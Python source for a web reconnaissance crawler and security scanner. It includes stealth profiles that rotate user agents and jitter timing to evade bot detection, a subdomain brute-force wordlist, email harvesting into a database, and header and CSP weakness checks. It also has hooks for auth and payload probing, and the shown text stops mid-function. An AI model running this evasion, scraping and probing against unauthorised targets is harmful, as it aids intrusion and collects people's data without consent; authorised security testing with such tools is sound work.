#!/usr/bin/env python3
import argparse
import sqlite3, re, random, sys, socket, ssl, time, json, os, heapq, itertools
from collections import defaultdict
import asyncio
import aiohttp
from datetime import datetime
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import urllib3
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import dns.resolver
import whois
import threading

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Playwright is optional — gracefully disabled if not installed
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# playwright-stealth is optional — suppresses bot-detection fingerprints
try:
    from playwright_stealth import Stealth
    PLAYWRIGHT_STEALTH_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_STEALTH_AVAILABLE = False

# pymysql is optional — enables MySQL auth probing
try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

# websockets is optional — enables WebSocket security probing
try:
    import websockets
    import websockets.exceptions
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

# colorama is optional — provides cross-platform ANSI color support.
# Colors are disabled automatically when stdout is not a TTY (piped output).
# Fore/Style stubs ensure all references are safe even when colorama is absent.
try:
    from colorama import Fore, Style, init as _colorama_init
    _colorama_init(autoreset=True)
    _COLORAMA_AVAILABLE = True
except ImportError:
    _COLORAMA_AVAILABLE = False
    class _Stub:                    # noqa: E302
        def __getattr__(self, _):
            return ""
    Fore  = _Stub()  # type: ignore[assignment]
    Style = _Stub()  # type: ignore[assignment]

# Disable colors when not writing to a real terminal (e.g. piped to a file)
USE_COLORS: bool = _COLORAMA_AVAILABLE and sys.stdout.isatty()


def _c(text: str, fore: str, style: str = "") -> str:
    """Wrap `text` with ANSI color codes if USE_COLORS is enabled."""
    if not USE_COLORS:
        return text
    reset = Style.RESET_ALL  # type: ignore[attr-defined]
    return f"{style}{fore}{text}{reset}"


def _sev_color(severity: str) -> str:
    """Return the ANSI-colored severity label, or the plain string if colors off."""
    if not USE_COLORS:
        return severity
    mapping = {
        "CRITICAL": Fore.RED   + Style.BRIGHT,  # type: ignore[operator]
        "HIGH":     Fore.RED,
        "MEDIUM":   Fore.YELLOW,
        "LOW":      Fore.CYAN,
        "INFO":     Fore.WHITE,
    }
    code = mapping.get(severity.upper(), "")
    reset = Style.RESET_ALL  # type: ignore[attr-defined]
    return f"{code}{severity}{reset}" if code else severity

# ─────────────────────────────────────────────
# DNS cache (TTL-based, shared across threads)
# ─────────────────────────────────────────────

_DNS_CACHE: dict      = {}          # (host, family, type, proto) -> (addrs, expire_monotonic)
_DNS_CACHE_TTL: float = 300.0       # seconds
_DNS_CACHE_LOCK       = threading.Lock()
_DNS_ORIG_GETADDRINFO = socket.getaddrinfo


def _is_ip_literal(host: str) -> bool:
    """Return True if *host* is already a resolved IPv4/IPv6 address."""
    for family in (socket.AF_INET, socket.AF_INET6):
        try:
            socket.inet_pton(family, host)
            return True
        except OSError:
            pass
    return False


def _cached_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):  # noqa: A002
    """Drop-in replacement for socket.getaddrinfo that caches results for _DNS_CACHE_TTL seconds."""
    if host is None or _is_ip_literal(host):
        return _DNS_ORIG_GETADDRINFO(host, port, family, type, proto, flags)

    cache_key = (host, family, type, proto)
    now = time.monotonic()

    with _DNS_CACHE_LOCK:
        entry = _DNS_CACHE.get(cache_key)
        if entry is not None:
            addrs, expire = entry
            if now < expire:
                # Cache hit — no network round-trip needed
                return addrs

    result = _DNS_ORIG_GETADDRINFO(host, port, family, type, proto, flags)

    with _DNS_CACHE_LOCK:
        _DNS_CACHE[cache_key] = (result, now + _DNS_CACHE_TTL)

    return result


# Install the caching resolver globally — all socket-based I/O benefits automatically.
socket.getaddrinfo = _cached_getaddrinfo  # type: ignore[assignment]

# ─────────────────────────────────────────────
# Thread-local connection pool (requests.Session per thread)
# ─────────────────────────────────────────────

_thread_local = threading.local()


def _get_session() -> requests.Session:
    """Return the requests.Session for the calling thread, creating it on first use.

    Each session mounts an HTTPAdapter with connection pooling so TCP connections
    to the same host are reused across calls within the same thread.
    """
    sess = getattr(_thread_local, "session", None)
    if sess is None:
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=10,
            pool_maxsize=20,
        )
        sess = requests.Session()
        sess.mount("http://", adapter)
        sess.mount("https://", adapter)
        _thread_local.session = sess
    return sess

# ─────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────

COMMON_PORTS    = [21, 22, 23, 25, 53, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]

# ─────────────────────────────────────────────
# Stealth profile system
# ─────────────────────────────────────────────

STEALTH_PROFILE  = "LOUD"  # overridden by --stealth CLI arg
BUG_BOUNTY_HEADER = None   # Set via --bug-bounty-header CLI arg. None = disabled.
SAME_DOMAIN_ONLY = False   # overridden by --same-domain-only CLI arg
START_URL        = ""      # set at crawler startup; used by is_in_scope()
ACTIVE_PROBES    = False   # overridden by --active-probes CLI arg; gates payload-injecting checks

# ─────────────────────────────────────────────
# Third-party CDN / external service exclusion
# ─────────────────────────────────────────────
# Active probes must never fire against these domains — they are not part of
# the target scope and probing them would constitute unauthorised testing.
# is_third_party_cdn() matches exact domains and any subdomain thereof.

_THIRD_PARTY_CDN_DOMAINS = frozenset({
    # Google
    "fonts.googleapis.com",
    "ajax.googleapis.com",
    "google-analytics.com",
    "googletagmanager.com",
    "doubleclick.net",
    "googleadservices.com",
    # Cloudflare / CDN hosts
    "cdnjs.cloudflare.com",
    "cloudflare.com",
    # jsDelivr / unpkg
    "cdn.jsdelivr.net",
    "jsdelivr.net",
    "unpkg.com",
    # Font Awesome
    "fontawesome.com",
    "use.fontawesome.com",
    # jQuery
    "jquery.com",
    "code.jquery.com",
    # Bootstrap CDN
    "bootstrapcdn.com",
    "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com",
    # Social / tracking
    "facebook.net",
    "connect.facebook.net",
    "twitter.com",
    "platform.twitter.com",
    "linkedin.com",
    "snap.licdn.com",
    # Analytics / session recording
    "hotjar.com",
    "static.hotjar.com",
    # Support widgets
    "intercom.io",
    "widget.intercom.io",
    # Payment / CAPTCHA
    "stripe.com",
    "js.stripe.com",
    "recaptcha.net",
    "www.recaptcha.net",
})


def is_third_party_cdn(netloc: str) -> bool:
    """
    Return True if `netloc` is, or is a subdomain of, a known third-party
    CDN or external service that must not be actively probed.

    Strips port suffix and leading 'www.' before comparing.
    """
    host = netloc.split(":")[0].lower().lstrip("www.")
    if not host:
        return False
    for cdn in _THIRD_PARTY_CDN_DOMAINS:
        if host == cdn or host.endswith("." + cdn):
            return True
    return False


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

# GHOST: per-domain request counters and pause thresholds
_domain_request_counts = defaultdict(int)
_ghost_thresholds      = {}   # domain -> current pause threshold (15–25)

def _ghost_pause_threshold(domain):
    if domain not in _ghost_thresholds:
        _ghost_thresholds[domain] = random.randint(15, 25)
    return _ghost_thresholds[domain]

def _reset_ghost_threshold(domain):
    _ghost_thresholds[domain] = random.randint(15, 25)

def stealth_delay(domain=None):
    """Sleep before every outbound HTTP request according to STEALTH_PROFILE."""
    if STEALTH_PROFILE == "LOUD":
        return
    if STEALTH_PROFILE == "NORMAL":
        time.sleep(random.uniform(0.5, 1.5))
    elif STEALTH_PROFILE == "GHOST":
        time.sleep(random.uniform(2.0, 6.0))
        if domain:
            _domain_request_counts[domain] += 1
            if _domain_request_counts[domain] >= _ghost_pause_threshold(domain):
                time.sleep(random.uniform(8.0, 15.0))
                _domain_request_counts[domain] = 0
                _reset_ghost_threshold(domain)

def stealth_headers(existing=None):
    """Return a headers dict with stealth values merged over existing."""
    if STEALTH_PROFILE == "LOUD":
        headers = dict(existing or {})
        if BUG_BOUNTY_HEADER:
            headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
        return headers
    headers = dict(existing or {})
    headers["User-Agent"] = random.choice(UA_POOL)
    headers["Accept-Language"] = random.choice([
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "en-US,en;q=0.8,es;q=0.6",
    ])
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate"])
    if STEALTH_PROFILE == "GHOST":
        if random.random() > 0.5:
            headers["DNT"] = "1"
        else:
            headers.pop("DNT", None)
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        if random.random() > 0.5:
            headers["Upgrade-Insecure-Requests"] = "1"
        else:
            headers.pop("Upgrade-Insecure-Requests", None)
    if BUG_BOUNTY_HEADER:
        headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
    return headers
RATE_LIMIT_MIN  = 1.0
RATE_LIMIT_MAX  = 3.0
MAX_CONCURRENT  = 5
SITEMAP_CAP     = 500
REQUEST_TIMEOUT = 8
ASYNC_TIMEOUT   = 10
QUEUE_SAVE_FILE     = "crawl_state.json"
PLAYWRIGHT_FLAGS    = {"enabled": False}  # mutable — no global needed
PLAYWRIGHT_TIMEOUT  = 15000   # ms — page load timeout for Playwright
PLAYWRIGHT_MAX_CONC = 2       # max concurrent browser pages (Pi-friendly)
JS_CONTENT_MIN      = 500     # bytes — if aiohttp gets less, try Playwright
QUEUE_SAVE_INTERVAL = 25

# ─────────────────────────────────────────────
# Adaptive concurrency
# ─────────────────────────────────────────────

class AdaptiveConcurrency:
    """Dynamically adjusts worker count based on rolling response-time and error windows."""

    _WINDOW = 20

    def __init__(self, start: int = 3, min_workers: int = 1, max_workers: int = 10):
        self._lock       = threading.Lock()
        self.workers     = start
        self.min_workers = min_workers
        self.max_workers = max_workers
        self._times: list  = []   # rolling elapsed seconds
        self._errors: list = []   # rolling bool flags

    def record(self, elapsed: float, is_error: bool) -> None:
        with self._lock:
            self._times.append(elapsed)
            self._errors.append(is_error)
            if len(self._times) > self._WINDOW:
                self._times.pop(0)
                self._errors.pop(0)
            if len(self._times) >= self._WINDOW:
                self._adjust()

    def record_429(self) -> None:
        with self._lock:
            old = self.workers
            self.workers = self.min_workers
            if self.workers != old:
                print(timestamp() + " [AdaptiveConcurrency] 429 received — throttling to "
                      + str(self.workers) + " worker(s), pausing 10 s")
            time.sleep(10)

    def _adjust(self) -> None:
        avg      = sum(self._times) / len(self._times)
        err_rate = sum(self._errors) / len(self._errors)
        old = self.workers
        if err_rate > 0.20:
            self.workers = max(self.min_workers, self.workers - 2)
        elif avg > 2.0:
            self.workers = max(self.min_workers, self.workers - 1)
        elif avg < 0.5:
            self.workers = min(self.max_workers, self.workers + 1)
        if self.workers != old:
            print(timestamp() + " [AdaptiveConcurrency] " + str(old) + "→" + str(self.workers)
                  + " workers (avg=" + f"{avg:.2f}" + "s err=" + f"{err_rate:.0%}" + ")")


# Singleton — initialised in main_crawler with CLI-supplied min/max
_ac: AdaptiveConcurrency = AdaptiveConcurrency()

# ─────────────────────────────────────────────
# Priority queue helpers
# ─────────────────────────────────────────────

_pq_seq = itertools.count()   # monotonically increasing; breaks priority ties with FIFO order

_P1_RE = re.compile(
    r"/api[/\b]|/graphql|/login|/signin|/auth[/\b]|/oauth|/token[/\b]"
    r"|/admin[/\b]|/dashboard|/wp-admin|/wp-json",
    re.IGNORECASE,
)
_P2_RE = re.compile(
    r"/upload|/download|/export|/import|/backup|/config[/\b]|/setting"
    r"|/user[/\b]|/account|/profile|/reset|/password|/register"
    r"|/payment|/checkout|/invoice|/order",
    re.IGNORECASE,
)
_P4_RE = re.compile(
    r"\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|mp3|zip|gz|tar)(\?|$)",
    re.IGNORECASE,
)


def _url_priority(url: str) -> int:
    """Return crawl priority tier for *url* (1=highest … 4=lowest)."""
    path = urlparse(url).path
    if _P1_RE.search(path):
        return 1
    if _P2_RE.search(path):
        return 2
    if _P4_RE.search(path):
        return 4
    return 3


def _pq_push(queue: list, url: str) -> None:
    """Push *url* onto the heapq priority queue."""
    heapq.heappush(queue, (_url_priority(url), next(_pq_seq), url))


def _pq_pop(queue: list) -> str:
    """Pop the highest-priority URL from the heapq priority queue."""
    _, _, url = heapq.heappop(queue)
    return url


# Subdomains to probe for each discovered root domain
SUBDOMAIN_WORDLIST = [
    "www", "mail", "smtp", "pop", "imap", "ftp", "sftp",
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "api", "api2", "v1", "v2", "rest", "graphql",
    "dev", "development", "staging", "stage", "uat", "test", "qa", "sandbox",
    "beta", "alpha", "preview", "demo",
    "shop", "store", "checkout", "payments", "billing",
    "vpn", "remote", "citrix", "rdp", "ssh",
    "git", "gitlab", "github", "bitbucket", "svn",
    "jenkins", "ci", "cd", "build", "deploy",
    "jira", "confluence", "wiki", "docs", "helpdesk", "support", "status",
    "cdn", "static", "assets", "media", "img", "images", "upload",
    "blog", "news", "forum", "community",
    "db", "database", "mysql", "postgres", "redis", "mongo",
    "mx", "mx1", "mx2", "email", "webmail", "exchange",
    "ns", "ns1", "ns2", "dns",
    "backup", "old", "archive",
    "mobile", "m", "app",
    "cloud", "s3", "storage",
]

# Security headers that should be present — absence is a finding
SECURITY_HEADERS_REQUIRED = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
]

# Headers that reveal info and shouldn't be present
SECURITY_HEADERS_SENSITIVE = [
    "X-Powered-By",
    "Server",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
]

TECH_SIGNATURES = {
    # ── CMS ───────────────────────────────────────────────────────────────
    "WordPress":      {
        "headers": ["Link: wp-json", "X-Powered-By: WP Engine", "X-Powered-By: WordPress"],
        "html":    ["wp-content/", "wp-includes/", "wp-login.php", "xmlrpc.php", "wp-json",
                    'name="generator" content="WordPress'],
    },
    "Drupal":         {
        "headers": ["X-Generator: Drupal", "X-Drupal-Cache", "X-Drupal-Dynamic-Cache"],
        "html":    ["drupal.settings", "/sites/default/files", "/misc/drupal.js", "drupal.org"],
    },
    "Joomla":         {
        "headers": [],
        "html":    ["/components/com_", "joomla!", "/media/jui/", "joomla.org",
                    'name="generator" content="Joomla'],
    },
    "Shopify":        {
        "headers": ["X-ShopId", "X-ShopifyRequestId", "X-Sorting-Hat-ShopId"],
        "html":    ["cdn.shopify.com", "shopify.theme", "myshopify.com", "shopify_pay"],
    },
    "Wix":            {
        "headers": ["X-Wix-Request-Id"],
        "html":    ["static.wixstatic.com", "wixsite.com", "wix.com/_api/"],
    },
    "Squarespace":    {
        "headers": [],
        "html":    ["squarespace.com", "static.squarespace", "squarespace-cdn.com"],
    },
    # ── JS frameworks ─────────────────────────────────────────────────────
    "React":          {
        "headers": [],
        "html":    ["__reactfiber", "__reactprops", "data-reactroot", "data-reactid", "react-dom"],
    },
    "Next.js":        {
        "headers": ["X-Powered-By: Next.js"],
        "html":    ["/_next/static/", "__next_data__", "/_next/chunks/"],
    },
    "Vue.js":         {
        "headers": [],
        "html":    ["__vue__", "__vue_app__", "data-v-app", "vue.min.js", "vue.runtime.min.js"],
    },
    "Nuxt.js":        {
        "headers": [],
        "html":    ["__nuxt", "__nuxt_data__", "/_nuxt/"],
    },
    "Angular":        {
        "headers": [],
        "html":    ["ng-version", "_nghost-", "_ngcontent-", "ng-reflect-", "angular.min.js"],
    },
    "Gatsby":         {
        "headers": [],
        "html":    ["___gatsby", "gatsby-chunk-mapping", "gatsby-focus-wrapper"],
    },
    "jQuery":         {
        "headers": [],
        "html":    ["jquery.min.js", "jquery-", "/jquery/", "jquery.js"],
    },
    "Bootstrap":      {
        "headers": [],
        "html":    ["bootstrap.min.css", "bootstrap.css", "bootstrap.min.js", "bootstrap.bundle"],
    },
    # ── Web servers / CDN ─────────────────────────────────────────────────
    "Cloudflare":     {
        "headers": ["CF-RAY", "cf-cache-status", "Server: cloudflare"],
        "html":    [],
    },
    "Nginx":          {
        "headers": ["Server: nginx"],
        "html":    [],
    },
    "Apache":         {
        "headers": ["Server: Apache", "Server: apache"],
        "html":    [],
    },
    "Microsoft IIS":  {
        "headers": ["Server: Microsoft-IIS"],
        "html":    [],
    },
    "LiteSpeed":      {
        "headers": ["Server: LiteSpeed", "Server: OpenLiteSpeed", "X-LiteSpeed-Cache"],
        "html":    [],
    },
    "Cloudfront":     {
        "headers": ["X-Amz-Cf-Id", "Via: cloudfront"],
        "html":    [],
    },
    # ── Analytics / tag management ────────────────────────────────────────
    "Google Analytics": {
        "headers": [],
        "html":    ["google-analytics.com", "gtag(", "ga('create'", "analytics.js"],
    },
    "Google Tag Mgr": {
        "headers": [],
        "html":    ["googletagmanager.com/gtm.js", "googletagmanager.com/ns.html"],
    },
    # ── Backend languages / frameworks ────────────────────────────────────
    "PHP":            {
        "headers": ["X-Powered-By: PHP"],
        "html":    ["<?php", "php fatal error", "call to undefined function"],
    },
    "ASP.NET":        {
        "headers": ["X-Powered-By: ASP.NET", "X-AspNet-Version", "X-AspNetMvc-Version"],
        "html":    ["__viewstate", "__eventvalidation", "webresource.axd", "scriptresource.axd"],
    },
    "Laravel":        {
        "headers": ["Set-Cookie: laravel_session", "X-Powered-By: PHP"],
        "html":    ["laravel_session", 'name="csrf-token"', "laravel"],
    },
    "Spring Boot":    {
        "headers": ["X-Application-Context", "X-Powered-By: Spring"],
        "html":    ["whitelabel error page", "/actuator/", "spring boot"],
    },
    "Django":         {
        "headers": ["Set-Cookie: csrftoken", "X-Frame-Options: SAMEORIGIN"],
        "html":    ["csrfmiddlewaretoken", "__admin_media_prefix__", "django"],
    },
    "Ruby on Rails":  {
        "headers": ["X-Runtime", "Set-Cookie: _session_id", "X-Powered-By: Phusion Passenger"],
        "html":    ["rails-ujs", "data-remote=\"true\"", "action-cable-consumer", "actiondispatch"],
    },
}

# ─────────────────────────────────────────────
# Utility
# ─────────────────────────────────────────────

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def print_error(error):
    print(timestamp() + " " + _c("ERROR:", Fore.RED, Style.BRIGHT) + " " + str(error))

def sanitize_url(url):
    url = url.replace("https://", "").replace("http://", "").replace("www.", "")
    if url.endswith("/"):
        url = url[:-1]
    return url

def extract_root_domain(domain):
    """
    Strip subdomains using the Public Suffix List.
    Correctly handles multi-part TLDs like .co.uk, .com.au, .org.nz etc.
    Falls back to naive last-two-parts if publicsuffix2 is unavailable.
    """
    try:
        import publicsuffix2
        return publicsuffix2.get_sld(domain) or domain
    except ImportError:
        # Fallback — naive but better than nothing
        # Handles common two-part TLDs manually
        TWO_PART_TLDS = {
            "co.uk", "co.nz", "co.au", "co.za", "co.jp", "co.in",
            "com.au", "com.br", "com.mx", "com.ar", "com.sg", "com.hk",
            "org.uk", "net.uk", "me.uk", "org.au", "net.au",
            "gov.uk", "gov.au", "gov.nz", "edu.au",
        }
        parts = domain.split(".")
        if len(parts) >= 3:
            two_part = ".".join(parts[-2:])
            if two_part in TWO_PART_TLDS:
                return ".".join(parts[-3:])
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return domain

def rate_limit():
    time.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))

# ─────────────────────────────────────────────
# Resume state
# ─────────────────────────────────────────────

def save_state(start_url, url_queue, url_seen, visited, pages_crawled, same_domain_only):
    state = {
        "start_url":        start_url,
        "same_domain_only": same_domain_only,
        "pages_crawled":    pages_crawled,
        "saved_at":         timestamp(),
        "url_queue":        [item[2] for item in url_queue],  # extract URLs from (pri, seq, url) tuples
        "url_seen":         list(url_seen),
        "visited":          list(visited),
    }
    try:
        with open(QUEUE_SAVE_FILE, "w") as f:
            json.dump(state, f)
        print(timestamp() + " State saved — " + str(len(url_queue)) + " in queue, " + str(pages_crawled) + " crawled.")
    except Exception as e:
        print_error("Failed to save state: " + str(e))

def load_state():
    try:
        with open(QUEUE_SAVE_FILE, "r") as f:
            state = json.load(f)
        print(timestamp() + " Resuming — " + str(len(state["url_queue"])) + " in queue, " + str(state["pages_crawled"]) + " already crawled.")
        return state
    except FileNotFoundError:
        return None
    except Exception as e:
        print_error("Failed to load state: " + str(e))
        return None

def clear_state():
    try:
        if os.path.exists(QUEUE_SAVE_FILE):
            os.remove(QUEUE_SAVE_FILE)
    except Exception:
        pass

# ─────────────────────────────────────────────
# Request helpers
# Accept-Encoding deliberately excludes br to avoid brotli issues
# ─────────────────────────────────────────────

def create_request_header():
    """Build a base request header dict. Stealth overrides applied via stealth_headers()."""
    base = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding":           "gzip, deflate",
        "Accept-Language":           "en-US,en;q=0.9",
        "User-Agent":                random.choice(UA_POOL),
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest":            "document",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-User":            "?1",
        "DNT":                       "1",
    }
    return stealth_headers(base)

def safe_get(url, timeout=REQUEST_TIMEOUT, method="get"):
    try:
        domain = urlparse(url).netloc
        stealth_delay(domain)
        sess = _get_session()
        fn = sess.get if method == "get" else sess.head
        return fn(url, headers=create_request_header(), timeout=timeout, allow_redirects=True)
    except Exception:
        return None

def grab_title(url):
    resp = safe_get(url)
    if resp and resp.status_code == 200:
        try:
            soup = BeautifulSoup(resp.content, "lxml")
            t = soup.find('title')
            return str(t.string).strip() if t else None
        except Exception:
            pass
    return None

# Valid TLDs for email filtering - blocks obvious garbage
VALID_EMAIL_TLDS = {
    "com","net","org","edu","gov","io","co","uk","ca","au","de","fr",
    "nl","se","no","dk","fi","ie","nz","jp","cn","ru","br","mx","in",
    "info","biz","me","tv","us","email","mail","ninja","dev","app",
}

def is_valid_email(email):
    """Filter out garbage matches from the regex."""
    # Must have exactly one @
    if email.count("@") != 1:
        return False
    local, domain = email.split("@")
    # Local part: 1-64 chars, no leading/trailing dots or hyphens
    if not local or len(local) > 64:
        return False
    if local.startswith(".") or local.startswith("-"):
        return False
    if local.endswith(".") or local.endswith("-"):
        return False
    # Domain must have at least one dot
    if "." not in domain:
        return False
    # TLD must be recognisable
    tld = domain.rsplit(".", 1)[-1].lower()
    if tld not in VALID_EMAIL_TLDS:
        return False
    # No consecutive dots
    if ".." in email:
        return False
    # Local part must be at least 2 chars and mostly printable ascii
    if len(local) < 2:
        return False
    # Reject if local part is all uppercase (usually a CSS/hex fragment)
    if local.isupper() and len(local) < 6:
        return False
    # Must contain at least one letter
    if not re.search(r"[a-zA-Z]", local):
        return False
    return True

# TLDs that are actually image/media file extensions, not real email domains
_FAKE_EMAIL_TLDS = {
    'png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'ico', 'bmp',
    'mp4', 'mp3', 'mov', 'avi', 'pdf', 'zip', 'js', 'css', 'json'
}

def _is_real_email(candidate):
    """Return False for regex matches that are image filenames or paths, not real emails."""
    candidate = candidate.strip()
    if candidate.count('@') != 1:
        return False
    local, domain = candidate.split('@', 1)
    if '/' in domain or '\\' in domain:
        return False
    if '.' not in domain:
        return False
    tld = domain.rsplit('.', 1)[-1].lower()
    if tld in _FAKE_EMAIL_TLDS:
        return False
    if '/' in local or '\\' in local:
        return False
    if len(local) < 1:
        return False
    return True

def email_scraper(html_content):
    try:
        # Tighter regex - requires proper structure
        email_pattern = r"[a-zA-Z0-9][a-zA-Z0-9\.\-\_\+]{0,62}@[a-zA-Z0-9][a-zA-Z0-9\-]{0,62}(?:\.[a-zA-Z0-9\-]{1,63})+\.[a-zA-Z]{2,}"
        soup = BeautifulSoup(html_content, "lxml")
        # Get text only - skip script and style tags
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ")
        raw = [e for e in re.findall(email_pattern, text) if _is_real_email(e)]
        # Also check href="mailto:..." links which are more reliable
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("mailto:"):
                addr = href[7:].split("?")[0].strip()
                if addr:
                    raw.append(addr)
        # Deduplicate, lowercase, validate
        seen = set()
        for email in raw:
            email = email.lower().strip(".,;:()[] ")
            if email in seen:
                continue
            seen.add(email)
            if is_valid_email(email):
                write_to_email_database(email)
    except Exception as e:
        print_error("email_scraper: " + str(e))

# ─────────────────────────────────────────────
# Security header analysis
# ─────────────────────────────────────────────

def analyze_security_headers(domain, headers):
    """
    Check response headers for security posture.
    Flags missing protective headers and leaky informational headers.
    Saves findings to SecurityHeaders table.
    """
    try:
        missing  = []
        present  = []
        leaking  = []

        for h in SECURITY_HEADERS_REQUIRED:
            if h.lower() in {k.lower() for k in headers}:
                present.append(h)
            else:
                missing.append(h)

        for h in SECURITY_HEADERS_SENSITIVE:
            val = headers.get(h) or headers.get(h.lower())
            if val:
                leaking.append(h + ": " + str(val))
                # Alert on EOL PHP versions — known vulnerable
                if h == "X-Powered-By" and "php" in str(val).lower():
                    try:
                        php_ver = str(val).lower().replace("php/", "").strip()
                        major = php_ver.split(".")[0]
                        if major in EOL_PHP_VERSIONS:
                            alert(
                                f"EOL PHP VERSION EXPOSED: {val}",
                                "CRITICAL",
                                domain,
                                f"X-Powered-By: {val} — PHP {major}.x is end-of-life and unpatched"
                            )
                    except Exception:
                        pass

        if missing:
            print(timestamp() + " Missing security headers on " + domain + ": " + ", ".join(missing))
        if leaking:
            print(timestamp() + " Leaking headers on " + domain + ": " + ", ".join(leaking))
        if present and not missing:
            print(timestamp() + " Security headers OK on " + domain)

        write_to_security_headers_database(domain, present, missing, leaking)

        # Deep CSP analysis if header is present
        csp_value = headers.get("Content-Security-Policy") or \
                    headers.get("content-security-policy")
        if csp_value:
            analyse_csp(domain, csp_value)

    except Exception as e:
        print_error("analyze_security_headers: " + str(e))


def analyse_csp(domain, csp_value):
    """
    Parse a Content-Security-Policy header and flag specific weaknesses
    that make XSS exploitation trivially easy.

    Each weakness is independently reportable. A policy with multiple
    issues is a stronger finding — the detail lists all of them.

    Severity:
      HIGH   — directive makes XSS directly exploitable
               (unsafe-inline in script-src, wildcard script-src, missing default-src)
      MEDIUM — weakens defence-in-depth without direct XSS enablement
               (unsafe-eval, data: URIs, overly broad img-src)
    """
    issues = []
    csp    = csp_value.lower()

    # Parse directives into a dict: directive → value string
    directives = {}
    for part in csp_value.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split(None, 1)
        directive = tokens[0].lower()
        value     = tokens[1].lower() if len(tokens) > 1 else ""
        directives[directive] = value

    # ── 1. Missing default-src ──────────────────────────────────
    # Without default-src, browsers fall back to allowing everything
    # for directives not explicitly set.
    if "default-src" not in directives and "script-src" not in directives:
        issues.append({
            "severity": "HIGH",
            "issue":    "Missing default-src and script-src",
